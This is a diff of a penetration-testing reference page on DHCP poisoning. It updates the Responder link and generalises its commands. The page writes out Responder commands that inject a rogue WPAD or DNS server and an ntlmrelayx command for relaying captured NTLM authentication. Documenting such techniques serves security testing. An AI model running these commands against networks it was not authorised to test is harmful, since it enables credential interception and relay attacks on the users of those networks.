@@ -15,7 +15,7 @@ When a workstation reboots or plugs into a network, a broadcast DHCP request is 
 
 ## Practice
 
-[Responder](https://github.com/SpiderLabs/Responder) (Python) can be used to operate DHCP poisoning in the following manner
+[Responder](https://github.com/lgandx/Responder) (Python) can be used to operate DHCP poisoning in the following manner
 
 * race against the legit DHCP server to answer `DHCP REQUEST` messages
 * sent a DHCP ACK response with a rogue WPAD server address in `option 252` in the network parameters, with a short lease (10 seconds). Responder can also be used to attempt at injecting a DNS server instead.
@@ -33,12 +33,12 @@ Additional arguments and options should be used when doing DHCP poisoning with t
 
 ```bash
 # DNS injection
-responder --interface "eth0" --DHCP --DHCP-DNS --wpad --ProxyAuth
-responder -I "eth0" -wPdD
+responder --interface "$INTERFACE" --DHCP --DHCP-DNS --wpad
+responder -I "$INTERFACE" -wdD
 
 # WPAD injection
-responder --interface "eth0" --DHCP --wpad --ProxyAuth
-responder -I "eth0" -wPd
+responder --interface "$INTERFACE" --DHCP --wpad
+responder -I "$INTERFACE" -wd
 ```
 
 > [!TIP]
@@ -48,7 +48,7 @@ responder -I "eth0" -wPd
 > * or forced and [relayed](../ntlm/relay.md) with [ntlmrelayx](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) (by using the `--http-port 3128` argument
 > 
 > ```bash
-> responder --interface "eth0" --DHCP --DHCP-DNS --wpad
+> responder --interface "$INTERFACE" --DHCP --DHCP-DNS --wpad
 > ntlmrelayx -t $target --http-port 3128
 > ```
 
